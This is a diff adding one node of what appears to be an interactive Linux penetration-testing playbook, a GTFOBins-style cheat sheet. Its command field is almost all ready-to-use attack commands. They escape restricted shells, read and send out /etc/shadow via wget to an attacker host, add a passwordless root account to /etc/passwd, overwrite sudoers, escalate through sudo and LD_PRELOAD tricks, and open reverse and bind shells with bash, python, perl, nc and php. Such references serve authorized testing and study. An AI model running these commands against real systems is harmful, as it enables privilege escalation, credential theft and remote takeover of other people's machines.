@@ -1,0 +1,26 @@
+{
+  "id": "gtfobins_linux",
+  "phase": "LINUX",
+  "title": "GTFOBins — Linux Living Off The Land",
+  "body": "Unix binaries that can be abused for privesc, file read/write, shells, and transfer. Reference: gtfobins.github.io — always filter by your context (SUID, sudo, capabilities).",
+  "cmd": "# ── REFERENCE ────────────────────────────────────────\n# https://gtfobins.github.io\n# Filter by: Shell | Sudo | SUID | File Read | File Write | Capabilities\n\n# ── SHELL — ESCAPE RESTRICTED SHELLS ─────────────────\npython3 -c 'import os; os.system(\"/bin/bash\")'\nperl -e 'exec \"/bin/bash\";'\nruby -e 'exec \"/bin/bash\"'\nlua -e 'os.execute(\"/bin/bash\")'\nawk 'BEGIN {system(\"/bin/bash\")}'\nfind / -name . -exec /bin/bash ; -quit\nexpect -c 'spawn /bin/bash; interact'\nnode -e 'require(\"child_process\").spawn(\"/bin/bash\",{stdio:\"inherit\"})'\n\n# ── FILE READ — READ ANY FILE ─────────────────────────\n# When binary has sudo/SUID/cap_dac_read_search\ncat /etc/shadow   # if readable\n# less\nsudo less /etc/shadow\n# !/bin/sh to get shell while in pager\n\n# more\nsudo more /etc/shadow\n\n# tail\nsudo tail -f /etc/shadow\n\n# head\nsudo head /etc/shadow\n\n# sort\nsudo sort /etc/shadow\n\n# base64 (encode then decode on Kali)\nbase64 /etc/shadow | base64 -d\n\n# tee (read + write)\nsudo tee /etc/shadow\n\n# cp (SUID — copy to readable location)\ncp /etc/shadow /tmp/s && cat /tmp/s\n\n# wget (exfil as POST)\nsudo wget --post-file=/etc/shadow http://$lhost:4444\n# Kali listener: nc -nlvp 4444\n\n# curl\ncurl file:///etc/shadow\n\n# dd\nsudo dd if=/etc/shadow\n\n# xxd\nsudo xxd /etc/shadow | xxd -r\n\n# ── FILE WRITE — WRITE ANY FILE ──────────────────────\n# tee\necho \"r00t::0:0::/root:/bin/bash\" | sudo tee -a /etc/passwd\n\n# dd\necho \"r00t::0:0::/root:/bin/bash\" | sudo dd of=/etc/passwd oflag=append conv=notrunc\n\n# cp (SUID)\necho \"joe ALL=(ALL) NOPASSWD:ALL\" > /tmp/s && cp /tmp/s /etc/sudoers\n\n# ── SUDO ESCAPES (common binaries) ───────────────────\n# vim\nsudo vim -c ':!/bin/bash'\n# nano — Ctrl+R Ctrl+X → reset; bash 1>&0 2>&0\n# less — !/bin/bash\n# man — !/bin/bash\n# git\nsudo git -p help    # then !/bin/bash in pager\nsudo git branch --help   # then !/bin/bash\n# git log\nsudo git log --help --P   # then !/bin/bash\n# ftp\nsudo ftp\n# ftp> !/bin/bash\n# zip\nsudo zip /tmp/x.zip /etc/passwd -T --unzip-command=\"sh -c /bin/bash\"\n# tar\nsudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash\n# mysql\nsudo mysql -e '! /bin/bash'\n# wget\nsudo wget -O /etc/sudoers http://$lhost/sudoers\n# rsync\nsudo rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null\n# strace\nsudo strace -o /dev/null /bin/bash\n# nmap (old)\nsudo nmap --interactive\n# env\nsudo env /bin/bash\n# LD_PRELOAD (if env_keep)\n# cat > /tmp/pe.c << EOF\n# #include<stdlib.h>\n# void _init(){setuid(0);system(\"/bin/bash\");}\n# EOF\ngcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c\nsudo LD_PRELOAD=/tmp/pe.so <allowed_cmd>\n\n# ── REVERSE SHELL ONE-LINERS ─────────────────────────\n# bash\nbash -i >& /dev/tcp/$lhost/$lport 0>&1\n# python3\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n# perl\nperl -e 'use Socket;$i=\"$lhost\";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'\n# nc with -e\nnc -e /bin/bash $lhost $lport\n# nc without -e\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $lhost $lport > /tmp/f\n# php\nphp -r '$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/bash -i <&3 >&3 2>&3\");'\n\n# ── BIND SHELL ───────────────────────────────────────\nnc -nlvp 4444 -e /bin/bash   # target listens\nnc $ip 4444                   # connect from Kali",
+  "warn": "Always check gtfobins.github.io with the correct filter for your context — a binary exploitable via sudo may not be exploitable via SUID and vice versa.",
+  "choices": [
+    {
+      "label": "sudo context",
+      "next": "sudo_check"
+    },
+    {
+      "label": "SUID context",
+      "next": "suid_check"
+    },
+    {
+      "label": "Got shell — stabilize it",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "Back to Linux privesc",
+      "next": "linux_post_exploit"
+    }
+  ]
+}
